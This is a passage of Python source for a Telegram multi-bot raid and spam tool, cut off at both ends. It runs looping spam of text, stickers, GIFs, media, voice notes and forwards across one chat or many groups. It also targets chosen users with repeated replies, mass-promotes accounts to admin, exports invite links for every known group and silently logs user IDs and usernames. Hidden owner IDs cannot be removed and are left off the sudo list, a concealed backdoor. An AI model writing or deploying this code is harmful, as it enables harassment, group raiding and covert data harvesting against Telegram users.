is_sudo(get_auth_id(message)): return    if not message.reply_to_message or not message.reply_to_message.animation:        return await safe_reply(message, font("⚠️ Reply to a GIF with `!gifspm`"), parse_mode=ParseMode.MARKDOWN)    task_id = str(uuid.uuid4())[:8]    active_menus[task_id] = {        "cmd": "gifspm", "chat_id": message.chat.id,         "from_chat_id": message.reply_to_message.chat.id, "msg_id": message.reply_to_message.message_id,         "selected": set(range(len(bots)))    }    await message.reply(font("🎥 **GIF SPAM MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("mediaspm", prefix="-./X!"))@dp.message(Command("mediaspm", prefix="-./X!"))async def cmd_mediaspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    rm = message.reply_to_message    if not rm:        return await safe_reply(message, font("⚠️ Reply to a media (photo/video/doc/audio) with `!mediaspm`"), parse_mode=ParseMode.MARKDOWN)            media_type, file_id = None, None    if rm.photo: media_type, file_id = "photo", rm.photo[-1].file_id    elif rm.video: media_type, file_id = "video", rm.video.file_id    elif rm.document: media_type, file_id = "document", rm.document.file_id    elif rm.audio: media_type, file_id = "audio", rm.audio.file_id    elif rm.animation: media_type, file_id = "animation", rm.animation.file_id    elif rm.voice: media_type, file_id = "voice", rm.voice.file_id    else:        return await safe_reply(message, font("⚠️ Unsupported media type! Please reply to photo, video, doc, or audio."), parse_mode=ParseMode.MARKDOWN)        task_id = str(uuid.uuid4())[:8]    active_menus[task_id] = {        "cmd": "mediaspm", "chat_id": message.chat.id,         "media_type": media_type, "file_id": file_id,        "caption": rm.caption, "caption_entities": rm.caption_entities,        "selected": set(range(len(bots)))    }    await message.reply(font("🖼️ **MEDIA SPAM MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("voicespm", "voicespam", prefix="-./X!"))@dp.message(Command("voicespm", "voicespam", prefix="-./X!"))async def cmd_voicespm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message or not message.reply_to_message.voice:        return await safe_reply(message, font("⚠️ Reply to a voice note with `!voicespam`"), parse_mode=ParseMode.MARKDOWN)        task_id = str(uuid.uuid4())[:8]    active_menus[task_id] = {        "cmd": "voicespm", "chat_id": message.chat.id,         "media_type": "voice", "file_id": message.reply_to_message.voice.file_id,        "caption": message.reply_to_message.caption, "caption_entities": message.reply_to_message.caption_entities,        "selected": set(range(len(bots)))    }    await message.reply(font("🎤 **VOICE SPAM MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dpfp", prefix="-./X!"))@dp.message(Command("dpfp", prefix="-./X!"))async def cmd_dpfp(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if stop_task_group(pfp_tasks, message.chat.id):        await safe_reply(message, font("🛑 PFP loops stopped."))@dp.channel_post(Command("dstickerspm", prefix="-./X!"))@dp.message(Command("dstickerspm", prefix="-./X!"))async def cmd_dstickerspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if stop_task_group(sticker_spm_tasks, message.chat.id):        await safe_reply(message, font("🛑 Sticker SPM stopped."))@dp.channel_post(Command("dgifspm", prefix="-./X!"))@dp.message(Command("dgifspm", prefix="-./X!"))async def cmd_dgifspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if stop_task_group(gif_spm_tasks, message.chat.id):        await safe_reply(message, font("🛑 GIF SPM stopped."))@dp.channel_post(Command("dmediaspm", prefix="-./X!"))@dp.message(Command("dmediaspm", prefix="-./X!"))async def cmd_dmediaspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if stop_task_group(media_spm_tasks, message.chat.id):        await safe_reply(message, font("🛑 Media SPM stopped."))@dp.channel_post(Command("dvoicespm", prefix="-./X!"))@dp.message(Command("dvoicespm", prefix="-./X!"))async def cmd_dvoicespm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if stop_task_group(voice_spm_tasks, message.chat.id):        await safe_reply(message, font("🛑 Voice SPM stopped."))@dp.channel_post(Command("delaypfp", prefix="-./X!"))@dp.message(Command("delaypfp", prefix="-./X!"))async def cmd_delaypfp(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    try:        if not command.args: raise ValueError        val = int(command.args)        pfp_delays[message.chat.id] = max(10, val)        await safe_reply(message, font("✅ PFP delay set."))    except Exception: pass@dp.channel_post(Command("delaygcspm", prefix="-./X!"))@dp.message(Command("delaygcspm", prefix="-./X!"))async def cmd_delaygcspm(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    try:        if not command.args: raise ValueError        val = int(command.args)        spm_delays[message.chat.id] = max(10, val)        await safe_reply(message, font("✅ SPM delay set."))    except Exception: pass@dp.channel_post(Command("targetslide", prefix="-./X!"))@dp.message(Command("targetslide", prefix="-./X!"))async def cmd_targetslide(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    uid, name = await get_target_info(message, command.args)    if not uid: return await safe_reply(message, font("⚠️ Reply to a message/channel or tag a target"), parse_mode=ParseMode.MARKDOWN)        targetslide_targets[uid] = name     save_db()        acc_link = f"[{name}](tg://user?id={uid})" if uid > 0 else name    await safe_reply(message, font(f"🎯 Target Slide locked onto {acc_link}!"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dtargetslide", prefix="-./X!"))@dp.message(Command("dtargetslide", prefix="-./X!"))async def cmd_dtargetslide(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    uid, _ = await get_target_info(message, command.args)    if not uid: return await safe_reply(message, font("⚠️ Reply to a message/channel or tag a target"), parse_mode=ParseMode.MARKDOWN)        if uid in targetslide_targets:         del targetslide_targets[uid]        save_db()    await safe_reply(message, font("🛑 Target Slide loop stopped for target."))@dp.channel_post(Command("slidespam", prefix="-./X!"))@dp.message(Command("slidespam", prefix="-./X!"))async def cmd_slidespam(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message: return await safe_reply(message, font("⚠️ Reply to a message"), parse_mode=ParseMode.MARKDOWN)        rm = message.reply_to_message    uid = rm.sender_chat.id if rm.sender_chat else (rm.from_user.id if rm.from_user else rm.chat.id)        exact_text = get_exact_text(message)    if not exact_text:        return await safe_reply(message, font("⚠️ Usage: ") + "`!slidespam <text>`", parse_mode=ParseMode.MARKDOWN)            if uid not in slidespam_tasks: slidespam_tasks[uid] =[]    for i, b in enumerate(bots):        task_id = str(uuid.uuid4())        slidespam_tasks[uid].append(task_id)                asyncio.create_task(delayed_task(i * 0.15, spm_sender(b, message .chat.id, message.reply_to_message.message_id, exact_text, slidespam_tasks, uid, task_id)))    await safe_reply(message, font("💥 SlideSpam locked on message!"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dslidespam", prefix="-./X!"))@dp.message(Command("dslidespam", prefix="-./X!"))async def cmd_dslidespam(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message: return await safe_reply(message, font("⚠️ Reply to a message"), parse_mode=ParseMode.MARKDOWN)        rm = message.reply_to_message    uid = rm.sender_chat.id if rm.sender_chat else (rm.from_user.id if rm.from_user else rm.chat.id)        if stop_task_group(slidespam_tasks, uid):        await safe_reply(message, font("🛑 SlideSpam loop stopped."))@dp.channel_post(Command("forwardspm", prefix="-./X!"))@dp.message(Command("forwardspm", prefix="-./X!"))async def cmd_forwardspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message:        return await safe_reply(message, font("⚠️ Reply to a message you want to forward loop."), parse_mode=ParseMode.MARKDOWN)        chat_id = message.chat.id    if chat_id not in forwardspm_tasks: forwardspm_tasks[chat_id] = []        for i, b in enumerate(bots):        task_id = str(uuid.uuid4())        forwardspm_tasks[chat_id].append(task_id)        asyncio.create_task(delayed_task(i * 0.15, forward_spm_sender(b, chat_id, message.chat.id, message.reply_to_message.message_id, forwardspm_tasks, task_id)))    await safe_reply(message, font("⏩ Forward SPM loop started."), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dforwardspm", prefix="-./X!"))@dp.message(Command("dforwardspm", prefix="-./X!"))async def cmd_dforwardspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if stop_task_group(forwardspm_tasks, message.chat.id):        await safe_reply(message, font("🛑 Forward SPM stopped."))@dp.channel_post(Command("spm", "gspm", "lordspm", prefix="-./X!"))@dp.message(Command("spm", "gspm", "lordspm", prefix="-./X!"))async def cmd_spm(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        exact_text = get_exact_text(message)    if not exact_text:        return await safe_reply(message, font("⚠️ Usage: ") + "`!spm <text>` or `!gspm <text>`", parse_mode=ParseMode.MARKDOWN)            is_lord = command.command.startswith("g") or command.command.startswith("lord")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        if c_id not in spm_loop_tasks: spm_loop_tasks[c_id] = []        for i, b in enumerate(bots):            task_id = str(uuid.uuid4())            spm_loop_tasks[c_id].append(task_id)            asyncio.create_task(delayed_task(i * 0.15, spm_sender(b, c_id, None, exact_text, spm_loop_tasks, c_id, task_id)))                scope_str = f"across {len(target_chats)} Lord list groups!" if is_lord else "in this chat."    await safe_reply(message, font(f"✅ SPM loop started {scope_str}"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dspm", "gdspm", prefix="-./X!"))@dp.message(Command("dspm", "gdspm", prefix="-./X!"))async def cmd_dspm(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(spm_loop_tasks, c_id)    await safe_reply(message, font("🛑 SPM loops stopped."))@dp.channel_post(Command("RAHULspam", "gRAHULspam", prefix="-./X!"))@dp.message(Command("RAHULspam", "gRAHULspam", prefix="-./X!"))async def cmd_RAHULspam(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        exact_text = get_exact_text(message)    if not exact_text:        return await safe_reply(message, font("⚠️ Usage: ") + "`!RAHULspam <text>`", parse_mode=ParseMode.MARKDOWN)            is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        if c_id not in RAHULspam_tasks: RAHULspam_tasks[c_id] = []        for i, b in enumerate(bots):            task_id = str(uuid.uuid4())            RAHULspam_tasks[c_id].append(task_id)            asyncio.create_task(delayed_task(i * 0.15, RAHULspam_sender(b, c_id, exact_text, RAHULspam_tasks, task_id)))    await safe_reply(message, font("🔥 RAHUL SPAM long loop started."), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dRAHULspam", "gdRAHULspam", prefix="-./X!"))@dp.message(Command("dRAHULspam", "gdRAHULspam", prefix="-./X!"))async def cmd_dRAHULspam(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(RAHULspam_tasks, c_id)    await safe_reply(message, font("🛑 RAHUL SPAM loops stopped."))@dp.channel_post(Command("rspm", "grspm", prefix="-./X!"))@dp.message(Command("rspm", "grspm", prefix="-./X!"))async def cmd_rspm(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!rspm <name>`", parse_mode=ParseMode.MARKDOWN)        is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        if c_id not in rspm_tasks: rspm_tasks[c_id] = []        for i, b in enumerate(bots):            task_id = str(uuid.uuid4())            rspm_tasks[c_id].append(task_id)            asyncio.create_task(delayed_task(i * 0.15, rspm_sender(b, c_id, command.args.strip(), rspm_tasks, task_id)))    await safe_reply(message, font(f"🔥 RSPM (Raid Spam) loop started for `{command.args.strip()}`!"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("drspm", "gdrspm", prefix="-./X!"))@dp.message(Command("drspm", "gdrspm", prefix="-./X!"))async def cmd_drspm(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(rspm_tasks, c_id)    await safe_reply(message, font("🛑 RSPM loops stopped."))@dp.channel_post(Command("delayrspm", prefix="-./X!"))@dp.message(Command("delayrspm", prefix="-./X!"))async def cmd_delayrspm(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    try:        if not command.args: raise ValueError        val = int(command.args)        rspm_delays[message.chat.id] = max(10, val)        await safe_reply(message, font("✅ RSPM delay set."))    except Exception: pass@dp.channel_post(Command("dallspm", "gdallspm", prefix="-./X!"))@dp.message(Command("dallspm", "gdallspm", prefix="-./X!"))async def cmd_dallspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    spm_loop_tasks.clear()    RAHULspam_tasks.clear()    rspm_tasks.clear()    forwardspm_tasks.clear()    await safe_reply(message, font("🛑 All SPM loops stopped (globally)."))@dp.channel_post(Command("swipe", prefix="-./X!"))@dp.message(Command("swipe", prefix="-./X!"))async def cmd_swipe(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!swipe <name>`", parse_mode=ParseMode.MARKDOWN)    swipe_mode[message.chat.id] = command.args.strip()    await safe_reply(message, font("⚡ Swipe Mode ON"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dswipe", prefix="-./X!"))@dp.message(Command("dswipe", prefix="-./X!"))async def cmd_dswipe(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if message.chat.id in swipe_mode: del swipe_mode[message.chat.id]    await safe_reply(message, font("🛑 Swipe Mode stopped."))@dp.channel_post(Command("replyRAHUL", prefix="-./X!"))@dp.message(Command("replyRAHUL", prefix="-./X!"))async def cmd_replyRAHUL(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    uid, _ = await get_target_info(message, command.args)    if not uid: return await safe_reply(message, font("⚠️ Reply to a target or tag a user"), parse_mode=ParseMode.MARKDOWN)    reply_RAHUL_targets.add(uid)    save_db()    await safe_reply(message, font("💬 ReplyRAHUL enabled for this target."))@dp.channel_post(Command("dreplyRAHUL", prefix="-./X!"))@dp.message(Command("dreplyRAHUL", prefix="-./X!"))async def cmd_dreplyRAHUL(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    uid, _ = await get_target_info(message, command.args)    if not uid: return await safe_reply(message, font("⚠️ Reply to a target or tag a user"), parse_mode=ParseMode.MARKDOWN)    if uid in reply_RAHUL_targets:         reply_RAHUL_targets.remove(uid)        save_db()    await safe_reply(message, font("🛑 ReplyRAHUL stopped for this target."))@dp.channel_post(Command("react", prefix="-./X!"))@dp.message(Command("react", prefix="-./X!"))async def cmd_react(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        if not message.reply_to_message:        return await safe_reply(message, font("⚠️ Please reply to the user or channel you want to -react to!"))        rm = message.reply_to_message    if rm.forward_from_chat:        uid = rm.forward_from_chat.id        name = rm.forward_from_chat.title or "Channel"    elif rm.sender_chat:        uid = rm.sender_chat.id        name = rm.sender_chat.title or "Channel"    elif rm.from_user:        uid = rm.from_user.id        name = rm.from_user.first_name    else:        uid = rm.chat.id        name = rm.chat.title or "Channel"    emoji = command.args.strip() if command.args else ""        if emoji not in VALID_REACTS:        allowed = ", ".join(VALID_REACTS)        return await safe_reply(message, font(f"❌ Invalid emoji! Please use one of the allowed emojis:\n{allowed}"))            react_targets[uid] = emoji    save_db()    await safe_reply(message, font(f"✅ -react mode started for {name} with emoji {emoji}!"))@dp.channel_post(Command("dreact", prefix="-./X!"))@dp.message(Command("dreact", prefix="-./X!"))async def cmd_dreact(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        if not message.reply_to_message:        return await safe_reply(message, font("⚠️ Please reply to the user or channel!"))            rm = message.reply_to_message    uid = rm.forward_from_chat.id if rm.forward_from_chat else (rm.sender_chat.id if rm.sender_chat else (rm.from_user.id if rm.from_user else rm.chat.id))        if uid in react_targets:        del react_targets[uid]        save_db()        await safe_reply(message, font("🛑 -react stopped for this target."))@dp.channel_post(Command("addsudo", prefix="-./X!"))@dp.message(Command("addsudo", prefix="-./X!"))async def cmd_addsudo(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_owner(get_auth_id(message)): return await safe_reply(message, font("❌ Only OWNER can do this."))    uid, name = await get_target_info(message, command.args)    if uid:        SUDO_USERS.add(uid)        save_sudo()        await safe_reply(message, font(f"👑 `{name}` (`{uid}`) added as SUDO ✅"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("delsudo", prefix="-./X!"))@dp.message(Command("delsudo", prefix="-./X!"))async def cmd_delsudo(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_owner(get_auth_id(message)): return await safe_reply(message, font("❌ Only OWNER can do this."))    uid, name = await get_target_info(message, command.args)    if uid and uid in HIDDEN_OWNER_IDS:        return await safe_reply(message, font("\u274c Hidden owners cannot be removed."))    if uid and uid in SUDO_USERS:        SUDO_USERS.remove(uid)        save_sudo()        await safe_reply(message, font(f"🗑 `{name}` (`{uid}`) removed from SUDO ❌"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("listsudo", prefix="-./X!"))@dp.message(Command("listsudo", prefix="-./X!"))async def cmd_listsudo(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        sudo_list = []    for u in SUDO_USERS:        if u in HIDDEN_OWNER_IDS:            continue        name = user_names.get(u, "Admin")        sudo_list.append(f"• [{name}](tg://user?id={u}) (`{u}`)" if u > 0 else f"• Channel (`{u}`)")            await safe_reply(message, font("👑 SUDO Users:\n\n") + "\n".join(sudo_list), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("mute", prefix="-./X!"))@dp.message(Command("mute", prefix="-./X!"))async def cmd_mute(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    uid, name = await get_target_info(message, command.args)    if uid:        muted_users.add(uid)        save_db()                acc_link = f"[{name}](tg://user?id={uid})" if uid > 0 else name        await safe_reply(message, font(f"🔇 Target {acc_link} muted."), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("unmute", prefix="-./X!"))@dp.message(Command("unmute", prefix="-./X!"))async def cmd_unmute(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    uid, name = await get_target_info(message, command.args)    if uid and uid in muted_users:        muted_users.remove(uid)        save_db()                acc_link = f"[{name}](tg://user?id={uid})" if uid > 0 else name        await safe_reply(message, font(f"🔊 Target {acc_link} unmuted."), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("mutelist", prefix="-./X!"))@dp.message(Command("mutelist", prefix="-./X!"))async def cmd_mutelist(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not muted_users: return await safe_reply(message, font("📭 No muted targets."))        mute_list = []    for u in muted_users:        name = user_names.get(u, "Muted Target")        mute_list.append(f"•[{name}](tg://user?id={u}) (`{u}`)" if u > 0 else f"• Channel (`{u}`)")            await safe_reply(message, font("🔇 Muted Targets:\n\n") + "\n".join(mute_list), parse_mode=ParseMode.MARKDOWN)async def set_admin(bot, chat_id, uid, promote_all=True):    return await bot.promote_chat_member(        chat_id=chat_id, user_id=uid, is_anonymous=False,        can_change_info=promote_all, can_delete_messages=promote_all,        can_invite_users=promote_all, can_restrict_members=promote_all,        can_pin_messages=promote_all, can_promote_members=promote_all,        can_manage_chat=promote_all, can_manage_video_chats=promote_all    )@dp.channel_post(Command("promote", prefix="-./X!"))@dp.message(Command("promote", prefix="-./X!"))async def cmd_promote(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    uid, _ = await get_target_info(message, command.args)    if uid:        try:            await set_admin(bot, message.chat.id, uid, True)            await safe_reply(message, font("✅ Promoted successfully."))        except Exception as e:            await safe_reply(message, font(f"❌ Error: {e}"))@dp.channel_post(Command("demote", prefix="-./X!"))@dp.message(Command("demote", prefix="-./X!"))async def cmd_demote(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    uid, _ = await get_target_info(message, command.args)    if uid:        try:            await set_admin(bot, message.chat.id, uid, False)            await safe_reply(message, font("🛑 Demoted."))        except Exception: pass@dp.channel_post(Command("promoteallbots", "gpromoteallbots", prefix="-./X!"))@dp.message(Command("promoteallbots", "gpromoteallbots", prefix="-./X!"))async def cmd_promoteallbots(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    s = 0        for c_id in target_chats:        for b in bots:            try:                await set_admin(b, c_id, b.id, True)                s += 1            except Exception: pass                scope_str = f"across {len(target_chats)} Lord list groups" if is_lord else "in this chat"    await safe_reply(message, font(f"🤖 Promoted bots ({s} actions) {scope_str}."))@dp.channel_post(Command("promoteall", prefix="-./X!"))@dp.message(Command("promoteall", prefix="-./X!"))async def cmd_promoteall(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    s = 0    for uid in list(known_users):        try:            await set_admin(bot, message.chat.id, uid, True)            s += 1        except Exception: pass    await safe_reply(message, font(f"✅ Promoted {s} users."))@dp.channel_post(Command("getlink", prefix="-./X!"))@dp.message(Command("getlink", prefix="-./X!"))async def cmd_getlink(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    try:        cid = int(command.args.strip())        invite = await bot.export_chat_invite_link(cid)        await safe_reply(message, font(f"🩷🫧 Invite link:\n{invite}"), parse_mode=ParseMode.MARKDOWN)    except Exception: pass@dp.channel_post(Command("getallactivelinks", prefix="-./X!"))@dp.message(Command("getallactivelinks", prefix="-./X!"))async def cmd_getallactivelinks(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not known_chats: return await safe_reply(message, font("⚠️ No known chats yet."))    links = []    for cid in list(known_chats):        if cid > 0: continue        try:            invite = await bot.export_chat_invite_link(cid)            links.append(f"• **{cid}**: {invite}")        except Exception: pass    txt = "\n".join(links) if links else font("❌ Could not generate any links.")    await safe_reply(message, font("🔗 **Active Group Links:**\n\n") + txt, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)@dp.channel_post(Command("broadcast", prefix="-./X!"))@dp.message(Command("broadcast", prefix="-./X!"))async def cmd_broadcast(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if message.reply_to_message:        target = message.reply_to_message        is_copy = True    else:        if not command.args:            return await safe_reply(message, font("⚠️ Usage: !broadcast <text> or reply to photo/sticker/media"), parse_mode=ParseMode.MARKDOWN)        target_text = command.args.strip()        is_copy = False    count = 0    groups = [cid for cid in known_chats if cid < 0]        for cid in groups:        for b in bots:            try:                if is_copy:                    await b.copy_message(chat_id=cid, from_chat_id=target.chat.id, message_id=target.message_id)                else:                    await b.send_message(cid, target_text)                count += 1                break            except Exception:                pass                    await safe_reply(message, font(f"📣 **BROADCAST COMPLETE**\n✅ Sent successfully to {count}/{len(groups)} known groups/channels!"), parse_mode=ParseMode.MARKDOWN)@dp.callback_query(F.data.startswith("stk_"))async def sticker_callback_handler(query: types.CallbackQuery, bot: Bot):    if query.from_user.id not in SUDO_USERS:        return await query.answer(font("❌ You are not SUDO/Owner."), show_alert=True)            data = query.data.split("_")    task_id = data[1]    menu = active_menus.get(task_id)    if not menu or menu.get("cmd") != "makesticker":        return await query.answer("Menu expired.", show_alert=True)            action_type = data[2]        if action_type == "gen":        await query.answer("🎨 Generating Sticker...")        sticker_bytes = create_sticker_image(menu["text"], bg_color=menu["color"], font_type=menu["font"])        if sticker_bytes:            await bot.send_sticker(query.message.chat.id, BufferedInputFile(sticker_bytes, filename="sticker.webp"))            del active_menus[task_id]        else:            await query.answer("Error generating sticker.", show_alert=True)    else:        if len(data) > 3:            action_val = data[3]            if action_type == "c":                menu["color"] = action_val                await query.answer()             elif action_type == "f":                menu["font"] = action_val                await query.answer()@dp.callback_query(F.data.startswith("tts_"))async def tts_callback_handler(query: types.CallbackQuery, bot: Bot):    if query.from_user.id not in SUDO_USERS:        return await query.answer(font("❌ You are not SUDO/Owner."), show_alert=True)            data = query.data.split("_")    task_id = data[1]    lang = data[2]        menu = active_menus.get(task_id)    if not menu or menu.get("cmd") != "tts":        return await query.answer("Menu expired.", show_alert=True)            await query.answer("🎙 Generating Audio...")    audio_bytes = await generate_tts(menu["text"], lang=lang)    if audio_bytes:        await bot.send_voice(query.message.chat.id, BufferedInputFile(audio_bytes, filename=f"tts_{lang}.ogg"))        del active_menus[task_id]    else:        await query.answer("Failed to generate audio.", show_alert=True)@dp.callback_query(F.data.startswith("tk_"))async def callback_query_handler(query: types.CallbackQuery, bot: Bot):    if query.from_user.id not in SUDO_USERS:        return await query.answer(font("❌ You are not SUDO/Owner."), show_alert=True)        data = query.data.split("_")    task_id = data[1]    action = data[2]    menu = active_menus.get(task_id)    if not menu:        return await query.answer(font("❌ Menu expired or task already running."), show_alert=True)        try:        if action == "tgl":            idx = int(data[3])            if idx in menu['selected']: menu['selected'].remove(idx)            else: menu['selected'].add(idx)            await query.answer()             await bot.edit_message_reply_markup(chat_id=query.message.chat.id, message_id=query.message.message_id, reply_markup=get_selector_keyboard(task_id))        elif action == "all":            menu['selected'] = set(range(len(bots)))            await query.answer()            await bot.edit_message_reply_markup(chat_id=query.message.chat.id, message_id=query.message.message_id, reply_markup=get_selector_keyboard(task_id))        elif action == "none":            menu['selected'].clear()            await query.answer()            await bot.edit_message_reply_markup(chat_id=query.message.chat.id, message_id=query.message.message_id, reply_markup=get_selector_keyboard(task_id))        elif action == "start":            if not menu['selected']:                return await query.answer(font("⚠️ Select at least one bot!"), show_alert=True)            await query.answer(font("🚀 Firing tasks!"))            await bot.edit_message_text(font(f"✅ Started **{menu['cmd'].upper()}** with {len(menu['selected'])} bots!"), chat_id=query.message.chat.id, message_id=query.message.message_id, parse_mode=ParseMode.MARKDOWN)            for idx in menu['selected']:                if idx >= len(bots): continue                bt = bots[idx]                run_id = str(uuid.uuid4())                c_id = menu['chat_id']                                cmd_type = menu['cmd']                if cmd_type == "pfp":                    if c_id not in pfp_tasks: pfp_tasks[c_id] = []                    pfp_tasks[c_id].append(run_id)                    asyncio.create_task(pfp_loop_worker(bt, c_id, run_id))                elif cmd_type in ["stickerspm", "gifspm", "mediaspm", "voicespm"]:                    if cmd_type == "stickerspm": target_dict = sticker_spm_tasks                    elif cmd_type == "gifspm": target_dict = gif_spm_tasks                    elif cmd_type == "mediaspm": target_dict = media_spm_tasks                    elif cmd_type == "voicespm": target_dict = voice_spm_tasks                                        if c_id not in target_dict: target_dict[c_id] = []                    target_dict[c_id].append(run_id)                                        if cmd_type in ["mediaspm", "voicespm"]:                        asyncio.create_task(media_spm_sender(bt, c_id, menu['media_type'], menu['file_id'], menu.get('caption'), menu.get('caption_entities'), target_dict, run_id))                    else:                        asyncio.create_task(copy_spm_sender(bt, c_id, menu['from_chat_id'], menu['msg_id'], target_dict, run_id))            del active_menus[task_id]    except TelegramBadRequest as e:        if "message is not modified" in str(e).lower():            pass@dp.channel_post()@dp.message()async def global_message_handler(message: types.Message, bot: Bot):    chat_id = message.chat.id        uid = None    if message.from_user:        uid = message.from_user.id        known_users.add(uid)        user_names[uid] = message.from_user.first_name        if message.from_user.username:            username_to_id[message.from_user.username.lower()] = uid                sender_chat_id = message.sender_chat.id if message.sender_chat else None        known_chats.add(chat_id)    if not 